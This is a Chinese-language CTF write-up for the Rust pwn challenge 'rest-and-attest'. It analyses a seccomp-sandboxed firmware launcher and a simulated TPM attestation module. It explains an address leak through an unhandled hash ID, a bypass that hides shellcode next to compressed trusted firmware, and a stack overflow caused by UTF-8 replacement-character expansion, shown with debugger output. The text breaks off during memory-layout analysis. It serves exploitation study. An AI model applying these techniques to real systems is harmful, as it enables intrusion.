rest-and-attest
---------------

这个题是一个`Rust Pwn`。拿到题目后，观察到有以下几个文件

```php
├── bin
│   ├── launcher
│   ├── run_challenge.sh
│   ├── sfm
│   ├── uploader
│   └── wrapper.sh
├── lib
│   ├── libcrypto.so.3
│   ├── libc.so.6
│   └── libgcc_s.so.1
└── src
    ├── Cargo.lock
    ├── Cargo.toml
    ├── sfm
    │   ├── Cargo.toml
    │   └── src
    │       ├── lib.rs
    │       ├── main.rs
    │       └── sfm_proto.rs
    ├── sfm-sys
    │   ├── build.rs
    │   ├── Cargo.toml
    │   ├── src
    │   │   └── lib.rs
    │   └── vendor
    └── uploader
        ├── Cargo.toml
        └── src
            ├── main.rs
            └── trusted_firmware.raw
```

首先根据文件目录，我们知道我们有一个`uploader`项目，一个`sfm`项目，一个辅助`sfm`项目的`sfm-sys`。基本上对应了bin目录下给出的相关二进制。然而，给出的二进制还包含了一个`launcher`，这个是没有源码的。这里`run_challenge.sh`和`wrapper.sh`脚本内容如下:  
`run_challenge.sh`

```sh
#!/bin/sh

# simulates challenge running in production environment
socat tcp4-listen:4444,reuseaddr,fork exec:"./wrapper.sh"
```

`wrapper.sh`

```sh
#!/bin/sh

exec 3<&- 4<&-

exec ./uploader
```

可以看到，程序入口就是`uploader`。

### 程序入口Uploader

我们先简单看一下uploader的逻辑。比较重要的如下:

```rust
fn io_loop() -> Result<(), Box<dyn Error>> {

    let mut image = include_bytes!("trusted_firmware.raw").to_vec();

    loop {
        let mut line = String::new();

        print!("> ");
        stdout().flush()?;
        stdin().read_line(&mut line)?;

        let command = line.trim();
        if command == String::from("upload") {
            image = get_new_image()?;
        } else if command == String::from("download") {
            do_download(&image)?;
        } else if command == String::from("run") {
            run_device(&image)?;
        } else if command == String::from("quit") {
            break;
        } else {
            println!("Invalid command {:}", command)
        }
    }

    Ok(())
}
```

这里四个逻辑，分别是：

- 上传一段shellcode二进制程序
- 下载现有的shellcode二进制
- 使用`launcher`运行对应的shellcode
- 退出

这里如果我们不上传的话，会使用默认的`trusted_firmware.raw`。这个shellcode存放在`sfm`这个项目的`src`中。  
当我们执行了`run`指令，程序会做出如下操作:

```rust
fn run_device(image: &Vec<u8>) -> Result<(), Box<dyn Error>> {

    let (mut sfm_child, client_sock) = launch_sfm()?;

    let mut temp_file = NamedTempFile::new()?;
    temp_file.write_all(&image[..])?;

    let temporary_path = temp_file.into_temp_path();

    let duped_fd = unsafe {
        match libc::dup(client_sock.as_raw_fd()) {
            -1 => Err(IoError::last_os_error()),
            new_fd => Ok(new_fd)
        }?
    };

    let mut fw_child = process::Command::new(LAUNCHER_PATH)
                                        .args([&temporary_path])
                                        .env("SFM_FD", duped_fd.as_raw_fd().to_string())
                                        .spawn()
                                        .expect("failed to execute emulator");

    fw_child.wait().expect("emulator wasn't running");

    sfm_child.kill().expect("was not running");

    Ok(())
}
```

流程大致如下

- 首先程序会尝试启动`sfm`程序，并且获得子进程对象，以及创建一个`client_sock`的通信句柄，这个句柄对应的`server_sock`会传入`sfm`，与`sfm`进行交互
- 程序会启动`launcher`这个程序，这个程序会使用`client_sock`通信句柄
- 我们之前上传的image（也就是shellcode）会作为启动选项的参数

### 引导程序Launcher - 沙箱

这个程序是一个C写的程序，最关键的地方如下:

```C
j_memcpy(hollow_and_jump_buffer, hollow_and_jump, 128LL);
if ( (unsigned int)mprotect(hollow_and_jump_buffer, 4096LL, 5LL) )
{
    perror("mprotect hollow logic region");
    return 1;
}
else if ( (unsigned int)install_seccomp_filter() )
{
    fwrite("Failed to isntall seccomp filter\n", 1LL, 33LL, stderr);
    return 1;
}
else
{
    hollow_and_jump_buffer(v15, v12, buffer);
    return 0;
}
```

程序将我们上传的`shellcode`读到了`buffer`中，然后通过一个mmap出来的`hollow_and_jump_buffer`函数跳转到`buffer`的逻辑上。同时这里注意，这个`install_seccomp_filter`会进行seccomp设置，设置的内容如下:

```php
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000002f  if (A != recvmsg) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

这里可以看出，程序只允许了四个系统调用

- read
- write
- recvmsg
- mummap

一开始的时候有一个想法：我们能不能直接上传一个文件，然后直接ORW，结果仔细看，这里没有允许open存在，那看来这个binary本身是没办法了。只能尝试从`sfm`处突破  
逆向到此处，我们需要对这个题目的输出输出流与运行状态稍作总结：

- 最初的时候uploader与我们对接，而uploader启动了launcher，lancher启动了raw
- 此时我们的输入和输出会直接与launcher执行的raw对接
- uploader创建了sfm进程，并且建立了socket通信，其中sock\_server作为了sfm的stream
- launcher接受了sock\_client，并且将其拷贝为3，这个3继承给了raw
- raw中使用3 fd与`SFM_FD`与`sfm`进行校验后，通过给`sfm`发送一个请求，重新将我们普通的数据输出流设定为1，2（与当前一致），然后进行通信

```php
+----------+                  +-----------+                  +-----------+
| launcher |                  |    raw    |                  |    sfm    |
+----------+                  +-----------+                  +-----------+
     |            input             |          sock_client         |
     |       --------------->       |       --------------->       |
     |                              |                              |
     |            output            |          sock_server         |
     |       <---------------       |       <---------------       |
     |                              |                              |
     |                              |                              |
     |                              |                              |
```

### RAW

这个RAW模块是一个作为例子的模块，`raw`与`sfm`的通信过程需要通过将`raw`逆向分析后，才能比较完整的理清楚这个过程。其中一个比较重的逻辑如下:

```C
int __usercall main_function@<eax>(int sock_fd@<edi>, __int64 argument@<rsi>, int std_fd@<edx>)
{
  puts_((unsigned int)std_fd, "Attested core booted...\n");
  while ( 1 )
  {
    LOWORD(buffer) = ' #';
    write(std_fd_1, (char *)&buffer, (int)&loc_1 + 1);
    *(_DWORD *)&input_buf[16] = 0;
    readline(std_fd, input_buf, 20i64);
    result = strcmp__(input_buf, "exit");
    if ( !result )
      break;
    if ( !strcmp__(input_buf, "identity") )
      identity(sock_fd, std_fd_1);
    if ( !strcmp__(input_buf, "quote") )
      quote();
    if ( !strcmp__(input_buf, "certify") )
      certify();
  }
  return result;
}
```

这里会有两个fd，一个是和`sfm`通信的sock，另一个则是用来和当前的标准输入输出流进行通信。后文的一些通信格式可以从这个binary中逆向得到。

### SFM模块

sfm模块是这个题目最关键的模块，这个模块会初始化一个`SFM(SecureFirewareModule)`模块，用于提供SFM的一些操作接口（也就是我们的主要漏洞点）。整个SFM模块主要逻辑基本上围绕着对我们创建的SFM对象的相关操作。

这个模块初始化的时候，首先会先模拟了使用一种叫做`(PCR)Platform Configuration Register`的认证方式

> 这个认证方式源自于TPM（Trusted Platform Module）中，PCR表示一段存在TPM架构中的一段内存。通常情况下，被设定为安全软件和重要引导程序的程序会被计算其hash值，然后存放在这个PCR中。当不同的PCR关联到同一个hash库中的时候，会被认为叫做`bank`。每一个`bank`对应一种hash算法，一个PCR可以分配给多个bank。不同的软件可以使用不同的算法做测量，产生不同的摘要，这些摘要就会被扩展到对应的bank中。  
> 在测量软件时，TPM仅仅用PCR来记录测量值。至于是否安全，这要到应用程序真正使用PCR用于policy授权的时候，或者是远程请求者请求一个签名认证（`quote`，引用）然后判定可信性。

在这个题目中，根据我们的执行情况，可以推断出前文`raw`程序执行的时候，一定是通过了`PCRPolicy`的认证。通过逆向`raw`的逻辑，可以得知，`raw`通过验证的办法，就是通过将自己的binary发送了过去，所以这个地方的`PCRPolicy`其实计算的就是`trusted_firmware.raw`的hash。*这里其实模拟了一个认证绕过的问题，下文可以看到如何使用*

接下来，程序给出了一些基本功能，包括

- (1) 获取当前证书信息
- (2) 更新bank的信息
- (3) 创建一个SFM对象，并且指定其认证方式
- (4) 修改当前SFM对象的基本属性，需要通过认证
- (5) 对当前SFM对象进行证书签名
- (6) 对sfm对象进行认证
- (7) 建立安全的通信连接

其中，系统提供的`raw`在初始化的时候，会调用`（2）（7）`，成功执行后才能够让`raw`接受我们用户侧的输入，并且能够传递给`sfm`。

```cpp
  get_firmware_data(3, 1i64, now_pc);
  if ( establish_secure_io() < 0 )
    return 1;
  main_function(3, std_fds, SHIDWORD(std_fds));
```

允许使用的功能只有`(1) (5) (6)`，简单逆向后会发现，这几个功能在正常初始化下基本上没有什么功能。因为这几个程序都在操作**sfm初始化时候正常初始化的模块**。显然，我们需要尝试**创建或者修改对应的模块**才能出发漏洞。

根据Rust语言的特性，rust本身出现漏洞的情况少之又少，所以我们首先快速的过一遍所有的`unsafe`部分，可以看到在`sfm-sys`这个模块下，存在着一些C语言的外部函数:

```rust
extern "C" {
    fn sfm_init_ek() -> *const EvpPkeyRsa;
    fn sfm_get_public_key(pkey: *const EvpPkeyRsa,
                          output: *mut u8) -> c_int;
    fn sfm_attest_to_quote(pkey: *const EvpPkeyRsa,
                           alg_id: u16,
                           banks: *const [u8; 64],
                           num_banks: usize,
                           output: *mut u8) -> c_int;
    fn sfm_certify_owner_record(pkey: *const EvpPkeyRsa,
                   owner_name: *const u8,
                   device_name: *const u8,
                   serial: u64,
                   timestamp: u32,
                   output: *mut u8) -> c_int;
    fn sfm_certify_key(pkey: *const EvpPkeyRsa,
                       key_data: *const u8,
                       output: *mut u8) -> c_int;
    fn sfm_certify_nv_storage(pkey: *const EvpPkeyRsa,
                              data: *const u8,
                              data_len: usize,
                              output: *mut u8) -> c_int;
}
```

这些外部函数很特别，首先题目中并没有给出他们的原型，其次是他们在被调用的时候，都有`unsafe`这个`label`存在，例如

```rust
    pub fn get_public_key(&self) -> Option<Vec<u8>> {
        let mut out_buf = [0u8; 512];
        let err = unsafe {
            sfm_get_public_key(self.ek, out_buf.as_mut_ptr())
        };

        if err != 0 {
            None
        } else {
            Some(out_buf.to_vec())
        }
    }
```

这些函数实现的内部仔细过了一遍，会发现有以下特征

- 大部分都使用了`memcpy`
- 结合程序传入参数和源码，可以得知这些函数都尝试将payload存放到栈上

这里我们以上文的`get_public_key`为例子，首先这个程序中的`out_buf`为一个指定大小的数组，其次其通过调用了`.as_mut_ptr`将自己声明为了可变的指针。在反汇编中如下:

```C
_QWORD *__fastcall sfm_sys::SecureFirmwareModule::get_public_key(_QWORD *a1, __int64 *a2)
{
  void *v2; // rax
  void *v3; // r14
  char v5[536]; // [rsp+0h] [rbp-218h] BYREF

  memset(v5, 0, 0x200uLL);
  if ( (unsigned int)sfm_get_public_key(*a2, v5) )
  {
    a1[1] = 0LL;
  }
  else
  {
    _rust_alloc();
    if ( !v2 )
      alloc::alloc::handle_alloc_error::h07edb87aaab24c34();
    v3 = v2;
    memcpy(v2, v5, 0x200uLL);
    *a1 = 512LL;
    a1[1] = v3;
    a1[2] = 512LL;
  }
  return a1;
}
```

这里的`v5`就是上文的`out_buf`。

然后大致过了一遍所有的unsafe，会发现在`certify`和`attest`这个操作的时候，有可能会有一些异常行为。（因为剩下的unsafe包含的逻辑基本上是固定的了）

#### attest - 信息泄露

> 在TPM过程中，"attestation"（attest）是指证明一个系统或者设备的身份和完整性，确保它是可信的。这是通过TPM的一系列安全功能来实现的，包括数字签名、密钥管理和远程验证等机制。具体来说，TPM attestation过程中，系统或设备会向TPM发送请求，TPM会对其进行验证并生成一个证明（attestation），证明该系统或设备的身份和完整性。这个证明可以被其他系统或设备用来验证该系统或设备的可信性

逆向`attest`操作，会发现里面有一个很简单就能发现的信息泄露:

```rust
#[derive(Debug)]
pub enum SfmHashAlgorithm {
    HashAlgSha1   = 0,
    HashAlgSha256 = 1,
    HashAlgSha384 = 2,
    HashAlgSha512 = 3,
    HashAlgMax    = 4,
}
///
    fn attest_quote(&mut self, cmd: WithTrailer<SfmAttestQuote>) -> SfmResult<bool> {
        let alg = cmd.alg_id;

        if alg > SfmHashAlgorithm::HashAlgMax as u16 {
            return Err(SfmError::InvalidAlgorithmType);
        }

        let report = self.sfm.attest(alg, self.banks.to_vec());

        self.stream.write_all(&report.ok_or(SfmError::SfmInternalError)?[..])?;
        Ok(true)
    }
```

在入口位置，程序校验了`alg_id`是否为有效的hash算法，这个`HashAlgMax`值为4.而在内部函数调用的时候:

```rust
  result = EVP_MD_CTX_new();
  v9 = result;
  if ( gid == 2 )
  {
    v10 = EVP_sha384();
    return sign_data(a1, v9, v10, a3, a4, a5);
  }
  if ( gid <= 2 )
  {
    if ( gid )
      v10 = EVP_sha256();
    else
      v10 = EVP_sha1();
    return sign_data(a1, v9, v10, a3, a4, a5);
  }
  if ( gid == 3 )
  {
    v10 = EVP_sha512();
    return sign_data(a1, v9, v10, a3, a4, a5);
  }
  return result;
```

这边值使用了`gid<=3`的情况，忘记了处理`gid=4`。所以当我们构造的请求满足`gid=4`的时候，这里的`EVP_MD_CTX_new`就会返回一个地址，从而泄露一个lib库的地址。

#### modify - 堆操作

##### NvStorage能溢出嘛?

在`certify`函数中，基本上都存在内存拷贝的问题，因此我们可以考虑创建或者修改对象来实现溢出。首先我们来看到创建的流程

```rust
    fn create_object(&mut self, cmd: WithTrailer<SfmCreateObject>) -> SfmResult<bool> {
        // first strip off the desired policy
        let policy_header = SfmAuthorizationPolicy::parse_with_trailer(cmd.get_trailer())
            .ok_or(SfmError::InvalidAuthPolicy)?;
        // skip some code..

        // create the object, return the id
        let object: Option<SfmObject> = match cmd.get_object_type().try_into() {
            // OwnershipRecord is not a creatable object type
            Ok(SfmObjectType::OwnershipRecord) => None,
            Ok(SfmObjectType::Key) => {
                let mut key_data = [0u8; 32];
                rand::thread_rng().fill_bytes(&mut key_data);
                Some(SfmObject::Key(Aes256Key { key_data } ))
            },
            Ok(SfmObjectType::NvStorage) => {
                let nv_storage_raw = NvStorageRaw::parse_with_trailer(policy_header.get_trailer())
                    .ok_or(SfmError::InvalidObjectValue(SfmObjectType::NvStorage))?;

                let size = nv_storage_raw.size as usize;
                if size > 1024 {
                    Err(SfmError::InvalidObjectValue(SfmObjectType::NvStorage))?;
                }
                Some(SfmObject::NvStorage(nv_storage_raw.get_trailer()[..size].to_vec()))
            }
            _ => None
        }
        let response_id = if let Some(object) = object {
            let object_with_policy = ObjectStoreItem {
                policy: policy,
                item: object
            };
            self.object_store.insert(self.last_object_id, object_with_policy);
            self.last_object_id.checked_add(1).expect("Object ID count overflowed");
            self.last_object_id - 1
        } else {
            eprintln!("Invalid object found");
            return Err(SfmError::InvalidObjectType(cmd.get_object_type()));
        };

    }
```

这里又要提一个细节：这边创建内存的时候，使用的是`parse_with_trailer`这个接口，这个接口的实现如下:

```rust
pub trait JustBytes {
    /// parse and return a reference to the underlying data and the trailer
    fn parse_with_trailer(bytes: &[u8]) -> Option<WithTrailer<Self>>
        where Self: Sized;

    /// construct a new copy of Self using `bytes` as a source
    fn new_from_bytes(bytes: &[u8]) -> Option<Self>
        where Self: Sized;
}

impl<T: AsBytes + FromBytes> JustBytes for T {

    fn parse_with_trailer(bytes: &[u8]) -> Option<WithTrailer<T>>
      where Self: Sized
    {
        let (content, trailer) = LayoutVerified::<&[u8], Self>::new_from_prefix(bytes)?;
        Some(WithTrailer::<T>{ inner: content.into_ref(), trailer })
    }

    fn new_from_bytes(bytes: &[u8]) -> Option<Self>
      where Self: Sized
    {
        Self::read_from(bytes)
    }
}
```

这边可以看到，这个`trait`为所有从`AsBytes`和`FromBytes`派生的对象实现了接口`parse_with_trailer`和`new_from_bytes`这两个接口，前者要求传入的字符串长度对齐`T`的最小align值，后者要求传入的bytes大小正好为`T`的大小。所以这两个接口基本上为序列化操作。

回到刚刚函数部分，这里`NvStorage`可以通过传入的字符串进行序列化。Rust实现序列化的时候，是自动的将内存填充到结构体中，而`NvStorage`相关结构体如下

```rust
#[repr(C)]
#[derive(Debug, AsBytes, FromBytes)]
pub struct NvStorageRaw {
    pub size: u16,
}
#[derive(Debug)]
pub enum SfmObject {
    OwnershipRecord(OwnershipRecord),
    Key(Aes256Key),
    NvStorage(Vec<u8>),
}
```

这里我们能控制`NvStorageRaw`中的`size`大小，以及对应写入的大小。然而这里的`size`在代码中限制最大值仅为`1024`，大小非常有限，在`certify`过程中，相关代码如下:

```rust
      let mut out_buf = [0u8; MAX_NV_STORAGE_CERT_SIZE]; //0x500

        let err = unsafe {
            sfm_certify_nv_storage(self.ek,
                                   data.as_ptr(),
                                   data.len(),
                                   out_buf.as_mut_ptr())
        };
```

可以看到溢出长度不够，只能使用其他对象。不过这边的`NvStoargeRaw`可以由用户控制**塞入任意的1024字节**，这点可以稍微记一下。

其他对象中，`Key`的长度也是属于无法发生溢出的情况，于是只能考虑`OwnershipRecord`

##### OwnershipRecord - 栈溢出 - Part1

`OwnershipRecord`这个对象首先无法在`create_object`中创建:

```rust
let object: Option<SfmObject> = match cmd.get_object_type().try_into() {
    // OwnershipRecord is not a creatable object type
    Ok(SfmObjectType::OwnershipRecord) => None,
}
```

从代码中可以看出，即使我们选择这个对象，它也是不会创建的。然而在sfm初始化的时候，实际上就创建过一个`OwnershipRecord`对象:

```rust
        let res = object_store.insert(0,
            ObjectStoreItem {
                policy: pcr_policy.clone(),
                item: SfmObject::OwnershipRecord (
                    ownership_record
                )
            }
        );
```

因此我们可以考虑**直接修改这个对象**，从而考虑是否构成危险。它可以在`modify`中被修改:

```rust
fn modify_object(&mut self, cmd: WithTrailer<SfmModifyObject>) -> SfmResult<bool> {
        let idx = cmd.get_object_index();

        // look up object
        let entry = self.object_store.get_mut(&idx.into())
            .ok_or(SfmError::InvalidObjectIndex(idx))?;

        let policy_header = SfmAuthorizationPolicy::parse_with_trailer(cmd.get_trailer())
            .ok_or(SfmError::InvalidAuthPolicy)?;

        let (authorized, trailer) = match entry.policy {
            // just look at here
            AuthorizationPolicy::PcrPolicy(desired_state) => {
                (self.banks == desired_state, cmd.get_trailer())
            },
        };

        if !authorized {
            return Err(SfmError::FailedAuth);
        }
        // modify according to type and set fields
        let new_object = match entry.item {
            SfmObject::OwnershipRecord(_) => {
                SfmObject::OwnershipRecord(
                  OwnershipRecordRaw::new_from_bytes(trailer)
                  .ok_or(SfmError::InvalidObjectValue(SfmObjectType::OwnershipRecord))?
                  .into()
                )
            }
            }
        };

        let new_entry = ObjectStoreItem {
            policy: entry.policy,
            item: new_object
        };

        *entry = new_entry;
    }
```

然而修改这个对象，我们需要让我们的`bank`与`desired_state`相等， 而这一步相当于是认证通过。这段其实模拟了`TPM`检测固件hash的过程，在未认证通过的情况下，没有办法修改`OwnershipRecord`。。。。吗？

#### 认证绕过

上文提到的漏洞点虽然存在，但是需要想办法进行认证绕过，然而从题目可知，这个绕过需要比对`desired_state`和`bank`相等，这个逻辑要怎么绕过呢？

程序提供了一个叫做`integrity_bank_update`的函数:

```rust
    fn integrity_bank_update(&mut self, cmd: WithTrailer<SfmIntegrityBankUpdate>) -> SfmResult<bool> {
        let bank_index = cmd.get_bank_index() as usize;

        if bank_index >= self.banks.len() {
            eprintln!("Invalid bank index specified");
            return Ok(false);
        }

        let mut hasher = Sha512::new();
        hasher.update(&self.banks[bank_index][..]);
        hasher.update(cmd.get_data());

        self.banks[bank_index] = hasher.finalize().into();

        self.stream.write_all(&(0_u32.to_le_bytes()))?;
        Ok(true)
    }
```

这个程序模拟了`TPM`更新hash的流程，由于开始的时候`bank`被初始化成了空值，所以在这边我们需要发送请求，将对应的`bank`更新。而只有更新为`trusted_firmware.raw`的hash值，的是偶，才能实现认证！

> 这里我们来仔细分析一下程序设计：对于TPM而言，此时它需要对我们的程序hash进行检测，从而保证我们的固件没有被修改。然而可能是出于一些特定的原因（例如当binary过大的时候，整体hash可能耗时太长）程序并未将整个binary进行hash并且检测，而是每1024个字节进行一次hash，最后比较整个hash数组，确保是否发生改变
> 
> 为了保证权限隔离，`TPM`的验证程序`sfm`肯定是无法直接接触到`launcher`送上来的`raw firmware`，所以两者之间使用了一个unix socket，模拟一种进程间隔离的情况下进行的通信检查，并且使用了看似合理的检查方式：上传的固件大小为`8192`，而`sfm`检查的时候，正好需要计算8段1024字节大的数据
> 
> `trusted_firmware`是通过将自身的binary发送过去，从而实现的认证。从这个角度看，当我们企图修改`trusted_firmware`中的任意一个字节，都将无通过校验；同时，如果我们尝试创建自己的binary，我们就会无法通过验证，看似是卡死了作弊的可能。

```php

  ┌──────────────┐           ┌──────────┐
  │              │           │          │
  │     8192     │           │   SFM    │
  │              │           │          │
  │              │           │          │
  │              │           │          │
  │              ├──────────►│          │
  │              │           │          │
  │              │           │          │
  │              │           │          │
  │              │           │          │
  │              │           │          │
  │              │           │          │
  └──────────────┘           └──────────┘

```

然而上述的安全逻辑之下却隐藏了一种可能：假设我们实现将`trusted_firmare`进行压缩之后，塞入新的逻辑，其中当校验过程发生时，将对应的内容解压，这样我们就能在能够完成认证的同时，又引入自己的新的恶意逻辑！：

```php
+--------------+           +----------+
|              |           |          |
|     8192     |           |   SFM    |
|              |           |          |
|   compress   |           |          |
|              |           |          |
+--------------+---------->|          |
|              |           |          |
|              |           |          |
|   shellcode  |           |          |
|              |           |          |
|              |           |          |
|              |           |          |
+--------------+           +----------+
```

于是在这种情况下，我们就能在完成认证的同时，实现自己的恶意代码攻击！

##### OwnershipRecord - 栈溢出 - Part2

当我们实现了认证之后，便可尝试触发下列代码实现更改`OwnershipRecord`:

```rust
SfmObject::OwnershipRecord(_) => {
    SfmObject::OwnershipRecord(
        OwnershipRecordRaw::new_from_bytes(trailer)
        .ok_or(SfmError::InvalidObjectValue(SfmObjectType::OwnershipRecord))?
        .into()
    )
}
```

这里有一个细节：之前我们提到过,`SfmObject::OwnershipRecord`这个enum类型使用的是`OwnershipRecord`这个结构体，然而这边却是使用了`OwnershipRecordRaw`这个结构体的`new_from_bytes`进行的反序列化，这两者之间如何转换的呢？

于是这边检查相关结构体:

```rust
#[repr(C)]
#[derive(Debug, AsBytes, FromBytes)]
pub struct OwnershipRecordRaw {
    pub country_code: [u8; 2],
    pub _padding: [u8; 2],
    pub owner_name: [u8; 64],
    pub device_name: [u8; 16],
    pub serial_number: [u8; 8],
    pub creation_date: u32,
}

impl From<OwnershipRecordRaw> for OwnershipRecord {
    fn from(item: OwnershipRecordRaw) -> Self {
        Self {
            country_code: String::from_utf8_lossy(&item.country_code[..]).to_string(),
            owner_name: String::from_utf8_lossy(&item.owner_name[..]).to_string(),
            device_name: item.device_name,
            serial_number: item.serial_number,
            creation_date: item.creation_date
        }
    }
}
```

这个地方有一个很有意思的地方：`OwnershipRecord`实现了一个接口，这个接口是针对`OwnershipRecordRaw`对象的`From`，这个接口的说明根据Rust官方网站说明

> The `From` trait allows for a type to define how to create itself from another type, hence providing a very simple mechanism for converting between several types.  
> The `Into` trait is simply the reciprocal of the From trait. That is, if you have implemented the From trait for your type, Into will call it when necessary.  
> The From and Into traits are inherently linked, and this is actually part of its implementation. It means if we write something like this: `impl From<T> for U`, then we can use let `u: U = U::from(T)` or `let u:U = T.into()`.

在这个代码中，当一个`OwnershipRecordRaw`调用`into()`函数的时候，上述代码就会自动触发。由于`new_from_bytes`为精准的反序列化过程，也就是说会严格按照`OwnershipRecordRaw`结构体大小进行反序列化，因此这些字符串基本上无法出现溢出。

然而**注意这里的`from_utf8_lossy`**函数，这个函数其实是一个处理`utf8`的函数，如果遇到普通的ascii，这个函数会把对应的字符串直接翻译，但是**如果遇到了ascii以外的字符串，其行为会是怎么样的呢？**，这里检查官方文档:

> Strings are made of bytes (u8), and a slice of bytes (&amp;\[u8\]) is made of bytes, so this function converts between the two. Not all byte slices are valid strings, however: strings are required to be valid UTF-8. During this conversion, from\_utf8\_lossy() will replace any invalid UTF-8 sequences with U+FFFD REPLACEMENT CHARACTER

官方文档提到，当我们传入的字符串为非`UTF-8`的形式的时候，这里的字符串会被**添加FF FD**两个多余的字符（并且替换掉原来的字符为替代字符）！换句话说，虽然这里的`country_code`或者`owner_name`会因为反序列化的要求，长度局限为2和64，然而会因为添加了`ff fd`多余的字符，长度变为现在的3倍！

接下来看到对应的`certify`功能：

```rust
pub fn certify_ownership_record(&mut self,
                                owner_name: &[u8],
                                device_name: &[u8],
                                serial: u64,
                                timestamp: u32) -> Option<Vec<u8>> {
    let mut out_buf = [0u8; MAX_OWNERSHIP_CERT_SIZE]; // 380

    let err = unsafe {
        sfm_certify_owner_record(self.ek,
                                    owner_name.as_ptr(),
                                    device_name.as_ptr(),
                                    serial,
                                    timestamp,
                                    out_buf.as_mut_ptr())
    };

    if err != 0 {
        None
    } else {
        Some(out_buf.to_vec())
    }
}
```

这个栈上的变量有380字节的空余，我们这个结构体`OwnershipRecordRaw`只有96字节，不足以构成溢出。转换后的`OwnershipRecord`大小大差不差（多了一点string的结构体），不过我们需要进一步看一下内部逻辑:

```cpp
  owner_cert = create_owner_cert(owner_name, device_name, serial, &cnt);
  if ( owner_cert )
  {
    v9 = EVP_MD_CTX_new();
    if ( v9 )
    {
      v10 = EVP_sha256();
      v11 = EVP_DigestSignInit(v9, 0LL, v10, 0LL, a1);
      if ( v11 == 1 )
      {
        if ( (unsigned int)EVP_DigestSignUpdate(v9, owner_cert, cnt) == 1 )
        {
          v11 = EVP_DigestSignFinal(v9, 0LL, (__int64)n);
          if ( v11 == 1 )
          {
            v14 = CRYPTO_malloc(n[0], "vendor/sfm/src/main.c", 292LL);
            v12 = (const void *)v14;
            if ( v14 )
            {
                /// skip code...

void* create_owner_cert(char *owner_name, char *device_name, char *serial, _QWORD *a4)
{
  result = malloc(0x10uLL);
  ptr[0] = result;
  if ( result )
  {
    *a4 = 16LL;
    *result = serial;
    *((_DWORD *)ptr[0] + 2) = time(0LL);
    if ( (unsigned int)append_kv_to_cert(ptr, a4, "O=", owner_name)
      || (unsigned int)append_separator_to_cert(ptr, a4, ",")
      || (appended = append_kv_to_cert(ptr, a4, "CN=", device_name), result = ptr[0], appended) )
    {
      free(ptr[0]);
      return 0LL;
    }
  }
  return result;
}

__int64 __fastcall append_kv_to_cert(void **a1, _QWORD *a2, const char *label, const char *in_buf2)
{
  v6 = strlen(label);
  total_len = strlen(in_buf2) + v6;
  v8 = (char *)realloc(*a1, total_len + *a2 + 1);
  if ( !v8 )
    return 1LL;
  v9 = v8;
  strcpy(&v8[*a2], label);
  lable_len = strlen(label);
  strcpy(&v9[*a2 + lable_len], in_buf2);
  *a1 = v9;
  result = 0LL;
  *a2 += total_len;
  return result;
}
```

可以看到，这边实际上拷贝了两个东西，一个是加密后的hash值，另一个是调用`create_owner_cert`创建的结构体。整体的hash其实是在对`create_owner_cert`算出来的值进行hash，而这个`owner_cert`对象其实就是我们传入的`OwnershipRecord`，并且添加了一些证书结构体。注意到这里的`append_kv_to_cert`函数底层实现实际上使用的是`strcpy`进行的数据拷贝，也就是说由于`utf-8`编码导致的内存扩展的漏洞现象会保留。  
其中根据调试可以知道，当我们把所有的字符串填满的情况下，hash值实际上有`0x100`字节那么大，此时拷贝逻辑如下:

```cpp
if ( (unsigned int)EVP_DigestSignFinal(v9, v14, (__int64)n) == 1 )
{
    v15 = n[0];
    memcpy(out_buf, v12, n[0]);
    v16 = &out_buf[v15];
    v11 = 0;
    memcpy(v16, owner_cert, cnt);
}
```

由于我们之前进行了内存扩展，此时的`owner_cert`已经远超96字节。以`device_name`填满`0xff`为例子，此时的大小已经达到了`224`字节！于是必定可以进行栈溢出攻击。根据调试，我们塞入一定量后的`0xff`，并且拼入一些`B`字符到`device_name`，可以得到如下的结果:

```php
0x7fffb2493a88: 0xbdbfefbdbfefbdbf      0xbfefbdbfefbdbfef                 
0x7fffb2493a98: 0xefbdbfefbdbfefbd      0xbdbfefbdbfefbdbf                 
0x7fffb2493aa8: 0xbfefbdbfefbdbfef      0xefbdbfefbdbfefbd
0x7fffb2493ab8: 0xbdbfefbdbfefbdbf      [0x4242424242424242] <---- rpb
0x7fffb2493ac8: 0x432c424242424242      0x4141414141413d4e
                ^^^^^^^^^^^^^^^^^                     ^^^^
                ret address                        here is struct header
```

此时我们就有了栈溢出的攻击原语

#### 内存布局构造

检查sfm可以知道，这个程序开启了所有的保护:

```php
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

由于我们现在存在ROP的手段，同时又有一个泄露数据的办法，我们可以先检查泄露的数据中会包含什么。

```php
00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000040  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│
00000050  01 00 00 00  00 00 00 00  90 d9 cb 68  89 7f 00 00  │····│····│···h│····│
00000060  20 f4 d6 68  89 7f 00 00  21 00 00 00  00 00 00 00  │ ··h│····│!···│····│
00000070  02 00 00 00  00 00 00 00  df ee cb 68  89 7f 00 00  │····│····│···h│····│
00000080  c0 b2 d6 68  89 7f 00 00  21 00 00 00  00 00 00 00  │···h│····│!···│····│
00000090  20 a6 5a 7e  c4 55 00 00  10 cb 5a 7e  c4 55 00 00  │ ·Z~│·U··│··Z~│·U··│
000000a0  db 0b 89 64  00 00 00 00  21 00 00 00  00 00 00 00  │···d│····│!···│····│
000000b0  02 00 00 00  00 00 00 00  cf 10 cc 68  89 7f 00 00  │····│····│···h│····│
000000c0  c0 84 d6 68  89 7f 00 00  21 00 00 00  00 00 00 00  │···h│····│!···│····│
000000d0  02 00 00 00  00 00 00 00  48 11 cc 68  89 7f 00 00  │····│····│H··h│····│
